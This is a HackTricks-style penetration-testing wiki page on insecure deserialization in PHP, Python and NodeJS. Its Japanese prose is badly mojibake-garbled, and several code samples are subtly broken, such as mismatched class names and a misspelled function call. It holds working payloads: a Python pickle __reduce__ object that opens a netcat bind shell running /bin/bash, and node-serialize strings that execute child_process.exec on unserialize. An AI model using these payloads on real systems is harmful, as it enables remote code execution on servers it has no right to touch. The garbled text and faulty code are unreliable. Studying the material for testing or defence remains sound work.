# Deserialization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä¿å­˜å¯èƒ½ãªå½¢å¼ã«å¤‰æ›ã™ã‚‹æ–¹æ³•ã¨ã—ã¦ç†è§£ã•ã‚Œã¦ãŠã‚Šã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä¿å­˜ã™ã‚‹ã‹ã€é€šä¿¡ãƒ—ãƒ­ã‚»ã‚¹ã®ä¸€éƒ¨ã¨ã—ã¦é€ä¿¡ã™ã‚‹ã“ã¨ã‚’æ„å›³ã—ã¦ã„ã¾ã™ã€‚ã“ã®æŠ€è¡“ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒå¾Œã§å†ä½œæˆã§ãã‚‹ã‚ˆã†ã«ã—ã€ãã®æ§‹é€ ã¨çŠ¶æ…‹ã‚’ç¶­æŒã™ã‚‹ãŸã‚ã«ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ã¯ã€é€†ã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã«å¯¾æŠ—ã™ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã§ã™ã€‚ç‰¹å®šã®å½¢å¼ã§æ§‹é€ åŒ–ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚’å–ã‚Šã€ãã‚Œã‚’ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å†æ§‹ç¯‰ã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚

ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã¯å±é™ºã§ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãªãœãªã‚‰ã€**æ”»æ’ƒè€…ãŒã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚’æ“ä½œã—ã¦æœ‰å®³ãªã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã‚Šã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå†æ§‹ç¯‰ãƒ—ãƒ­ã‚»ã‚¹ä¸­ã«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«äºˆæœŸã—ãªã„å‹•ä½œã‚’å¼•ãèµ·ã“ã™ã“ã¨ã‚’è¨±ã™å¯èƒ½æ€§ãŒã‚ã‚‹ã‹ã‚‰ã§ã™ã€‚**

## PHP

PHPã§ã¯ã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãŠã‚ˆã³ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒ—ãƒ­ã‚»ã‚¹ä¸­ã«ç‰¹å®šã®ãƒã‚¸ãƒƒã‚¯ãƒ¡ã‚½ãƒƒãƒ‰ãŒåˆ©ç”¨ã•ã‚Œã¾ã™ï¼š

* `__sleep`: ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¨ãã«å‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¹ãã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã™ã¹ã¦ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®åå‰ã®é…åˆ—ã‚’è¿”ã™å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¿ç•™ä¸­ã®ãƒ‡ãƒ¼ã‚¿ã‚’ã‚³ãƒŸãƒƒãƒˆã—ãŸã‚Šã€åŒæ§˜ã®ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—ã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
* `__wakeup`: ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¨ãã«å‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºä¸­ã«å¤±ã‚ã‚ŒãŸå¯èƒ½æ€§ã®ã‚ã‚‹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶šã‚’å†ç¢ºç«‹ã—ã€ä»–ã®å†åˆæœŸåŒ–ã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
* `__unserialize`: ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¨ãã«ã€`__wakeup`ã®ä»£ã‚ã‚Šã«å‘¼ã³å‡ºã•ã‚Œã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã§ã™ã€‚`__wakeup`ã«æ¯”ã¹ã¦ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒ—ãƒ­ã‚»ã‚¹ã«å¯¾ã™ã‚‹ã‚ˆã‚Šå¤šãã®åˆ¶å¾¡ã‚’æä¾›ã—ã¾ã™ã€‚
* `__destruct`: ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒç ´æ£„ã•ã‚Œã‚‹ç›´å‰ã¾ãŸã¯ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒçµ‚äº†ã™ã‚‹ã¨ãã«å‘¼ã³å‡ºã•ã‚Œã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã§ã™ã€‚é€šå¸¸ã€ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ³ãƒ‰ãƒ«ã‚„ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶šã‚’é–‰ã˜ã‚‹ãªã©ã®ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—ã‚¿ã‚¹ã‚¯ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
* `__toString`: ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ–‡å­—åˆ—ã¨ã—ã¦æ‰±ã†ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ãŸã‚ã‚„ã€ãã®ä¸­ã®é–¢æ•°å‘¼ã³å‡ºã—ã«åŸºã¥ãä»–ã®ã‚¿ã‚¹ã‚¯ã«ä½¿ç”¨ã§ãã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ†ã‚­ã‚¹ãƒˆè¡¨ç¾ã‚’åŠ¹æœçš„ã«æä¾›ã—ã¾ã™ã€‚
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¨ãã«ã€é–¢æ•° **`__wakeup`** ã¨ **`__destruct`** ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã“ã¨ãŒçµæœã‹ã‚‰ã‚ã‹ã‚Šã¾ã™ã€‚ã„ãã¤ã‹ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã§ã¯ã€å±æ€§ã‚’å°åˆ·ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ **`__toString`** é–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã¨ã•ã‚Œã¦ã„ã¾ã™ãŒã€ã©ã†ã‚„ã‚‰ãã‚Œã¯ **ã‚‚ã†èµ·ã“ã£ã¦ã„ãªã„** ã‚ˆã†ã§ã™ã€‚

{% hint style="warning" %}
ã‚¯ãƒ©ã‚¹ã«å®Ÿè£…ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ¡ã‚½ãƒƒãƒ‰ **`__unserialize(array $data)`** ã¯ **`__wakeup()`** ã®ä»£ã‚ã‚Šã«å‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚’é…åˆ—ã¨ã—ã¦æä¾›ã™ã‚‹ã“ã¨ã§ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã§ãã¾ã™ã€‚ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºæ™‚ã«å¿…è¦ãªã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

èª¬æ˜ã•ã‚ŒãŸ**PHPã®ä¾‹ã‚’ã“ã¡ã‚‰ã§èª­ã‚€ã“ã¨ãŒã§ãã¾ã™**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)ã€ã“ã¡ã‚‰ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ã¾ãŸã¯ã“ã¡ã‚‰ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

PHPã®ã‚ªãƒ¼ãƒˆãƒ­ãƒ¼ãƒ‰æ©Ÿèƒ½ã‚’æ‚ªç”¨ã—ã¦ã€ä»»æ„ã®phpãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### å‚ç…§å€¤ã®ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º

ä½•ã‚‰ã‹ã®ç†ç”±ã§ã€**åˆ¥ã®ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸå€¤ã¸ã®å‚ç…§**ã¨ã—ã¦å€¤ã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ãŸã„å ´åˆã¯ã€æ¬¡ã®ã‚ˆã†ã«ã§ãã¾ã™:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) ã¯ã€PHP ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚\
ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰å†…ã§ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‰ã‚Œãªã„å ´åˆã‚‚ã‚ã‚Šã¾ã™ãŒã€**å¤–éƒ¨ PHP æ‹¡å¼µã®ã‚³ãƒ¼ãƒ‰ã‚’æ‚ªç”¨ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚**\
ã§ã™ã®ã§ã€å¯èƒ½ã§ã‚ã‚Œã°ã€ã‚µãƒ¼ãƒãƒ¼ã® `phpinfo()` ã‚’ç¢ºèªã—ã€**ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§æ¤œç´¢**ï¼ˆã•ã‚‰ã«ã¯ **PHPGGC** ã® **gadgets** ã§ã‚‚ï¼‰ã—ã¦ã€æ‚ªç”¨ã§ãã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’æ¢ã—ã¦ãã ã•ã„ã€‚

### phar:// ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º

ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã ã‘ã§ã€å†…éƒ¨ã® PHP ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ãªã„ LFI ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€ä¾‹ãˆã° _**file\_get\_contents(), fopen(), file() ã¾ãŸã¯ file\_exists(), md5\_file(), filemtime() ã¾ãŸã¯ filesize()**_** ã®ã‚ˆã†ãªé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€**phar** ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦ **ãƒ•ã‚¡ã‚¤ãƒ«** ã‚’ **èª­ã¿å–ã‚‹** ã¨ãã«ç™ºç”Ÿã™ã‚‹ **ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º** ã‚’æ‚ªç”¨ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®æŠ•ç¨¿ã‚’ãŠèª­ã¿ãã ã•ã„ï¼š

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒã‚¢ãƒ³ãƒ”ã‚¯ãƒ«ã•ã‚Œã‚‹ã¨ã€é–¢æ•° _\_\_reduce\_\__ ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚\
æ‚ªç”¨ã•ã‚Œã‚‹ã¨ã€ã‚µãƒ¼ãƒãƒ¼ã¯ã‚¨ãƒ©ãƒ¼ã‚’è¿”ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Before checking the bypass technique, try using `print(base64.b64encode(pickle.dumps(P(),2)))` to generate an object that is compatible with python2 if you're running python3.

For more information about escaping from **pickle jails** check:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

æ¬¡ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€**yamlã®å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’æ‚ªç”¨ã™ã‚‹æŠ€è¡“**ã‚’ç´¹ä»‹ã—ã€**Pickleã€PyYAMLã€jsonpickleã€ruamel.yaml**ã®ãŸã‚ã®RCEãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ãƒ„ãƒ¼ãƒ«ã§çµ‚ã‚ã‚Šã¾ã™ï¼š

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JS **ã«ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹ãŸã‚ã ã‘ã«å®Ÿè¡Œã•ã‚Œã‚‹ã€Œãƒã‚¸ãƒƒã‚¯ã€é–¢æ•°ã¯ã‚ã‚Šã¾ã›ã‚“**ã€‚ã—ã‹ã—ã€**`toString`**ã€**`valueOf`**ã€**`toJSON`**ã®ã‚ˆã†ã«ã€**ç›´æ¥å‘¼ã³å‡ºã•ãªãã¦ã‚‚é »ç¹ã«ä½¿ç”¨ã•ã‚Œã‚‹é–¢æ•°**ãŒã‚ã‚Šã¾ã™ã€‚\
ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’æ‚ªç”¨ã™ã‚‹å ´åˆã€ã“ã‚Œã‚‰ã®é–¢æ•°ã‚’**å¦¥å”ã—ã¦ä»–ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€å‘¼ã³å‡ºã•ã‚ŒãŸã¨ãã«ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

é–¢æ•°ã‚’ç›´æ¥å‘¼ã³å‡ºã•ãšã«**ã€Œãƒã‚¸ãƒƒã‚¯ã€ãªæ–¹æ³•ã§é–¢æ•°ã‚’å‘¼ã³å‡ºã™**ã‚‚ã†ä¸€ã¤ã®æ–¹æ³•ã¯ã€**éåŒæœŸé–¢æ•°**ï¼ˆãƒ—ãƒ­ãƒŸã‚¹ï¼‰ã«ã‚ˆã£ã¦è¿”ã•ã‚Œã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’**å¦¥å”ã™ã‚‹**ã“ã¨ã§ã™ã€‚ãªãœãªã‚‰ã€ãã®**è¿”ã•ã‚Œã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã‚’**é–¢æ•°å‹ã®ã€Œthenã€ã¨ã„ã†ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£**ã‚’æŒã¤åˆ¥ã®**ãƒ—ãƒ­ãƒŸã‚¹**ã«**å¤‰æ›**ã™ã‚‹ã¨ã€åˆ¥ã®ãƒ—ãƒ­ãƒŸã‚¹ã«ã‚ˆã£ã¦è¿”ã•ã‚Œã‚‹ã ã‘ã§**å®Ÿè¡Œã•ã‚Œã‚‹**ã‹ã‚‰ã§ã™ã€‚ _è©³ç´°ã«ã¤ã„ã¦ã¯_ [_**ã“ã®ãƒªãƒ³ã‚¯**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚_
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` ã¨ `prototype` ã®æ±šæŸ“

ã“ã®æŠ€è¡“ã«ã¤ã„ã¦å­¦ã³ãŸã„å ´åˆã¯ã€**æ¬¡ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’è¦‹ã¦ãã ã•ã„**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

ã“ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯é–¢æ•°ã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ä¾‹:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
The **serialised object** will looks like:  
ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
You can see in the example that when a function is serialized the `_$$ND_FUNC$$_` flag is appended to the serialized object.

Inside the file `node-serialize/lib/serialize.js` you can find the same flag and how the code is using it.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

As you may see in the last chunk of code, **if the flag is found** `eval` is used to deserialize the function, so basically **user input if being used inside the `eval` function**.

ã—ã‹ã—ã€**é–¢æ•°ã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ã ã‘ã§ã¯**ãã‚Œã‚’**å®Ÿè¡Œã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚ãªãœãªã‚‰ã€ã‚³ãƒ¼ãƒ‰ã®ä¸€éƒ¨ãŒ**`y.rce`ã‚’å‘¼ã³å‡ºã™å¿…è¦ãŒã‚ã‚‹**ã‹ã‚‰ã§ã€ã“ã‚Œã¯éå¸¸ã«**ã‚ã‚Šãã†ã«ã‚ã‚Šã¾ã›ã‚“**ã€‚\
ã¨ã«ã‹ãã€**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä¿®æ­£ã—ã¦**ã€**ã„ãã¤ã‹ã®æ‹¬å¼§ã‚’è¿½åŠ ã™ã‚‹**ã“ã¨ã§ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã¨ãã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸé–¢æ•°ã‚’è‡ªå‹•çš„ã«å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã®ãƒãƒ£ãƒ³ã‚¯ã§ã¯ã€**æœ€å¾Œã®æ‹¬å¼§**ã¨`unserialize`é–¢æ•°ãŒã©ã®ã‚ˆã†ã«è‡ªå‹•çš„ã«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã‹ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼š
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
ä»¥å‰ã«ç¤ºã—ãŸã‚ˆã†ã«ã€ã“ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯`_$$ND_FUNC$$_`ã®å¾Œã®ã‚³ãƒ¼ãƒ‰ã‚’å–å¾—ã—ã€`eval`ã‚’ä½¿ç”¨ã—ã¦**å®Ÿè¡Œã—ã¾ã™**ã€‚ã—ãŸãŒã£ã¦ã€**ã‚³ãƒ¼ãƒ‰ã‚’è‡ªå‹•å®Ÿè¡Œ**ã™ã‚‹ã«ã¯ã€**é–¢æ•°ä½œæˆ**éƒ¨åˆ†ã¨æœ€å¾Œã®æ‹¬å¼§ã‚’**å‰Šé™¤ã—**ã€æ¬¡ã®ä¾‹ã®ã‚ˆã†ã«**JSã®ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã‚’å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
ã“ã“ã§[**è©³ç´°æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦**ã€‚

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**ã®æ³¨ç›®ã™ã¹ãç‚¹ã¯ã€**æ¨™æº–ã®çµ„ã¿è¾¼ã¿ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒä¸å¯èƒ½ã§ã‚ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã‚‰ã¯ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªã‚¹ã‚³ãƒ¼ãƒ—ã®å¤–ã«ã‚ã‚Šã¾ã™ã€‚ã“ã®åˆ¶é™ã«ã‚ˆã‚Šã€çµ„ã¿è¾¼ã¿ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºãã†ã¨ã™ã‚‹ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡ŒãŒå¦¨ã’ã‚‰ã‚Œã€`console.log()`ã‚„`require(something)`ã®ã‚ˆã†ãªã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€`"ReferenceError: console is not defined"`ã®ã‚ˆã†ãªä¾‹å¤–ãŒç™ºç”Ÿã—ã¾ã™ã€‚

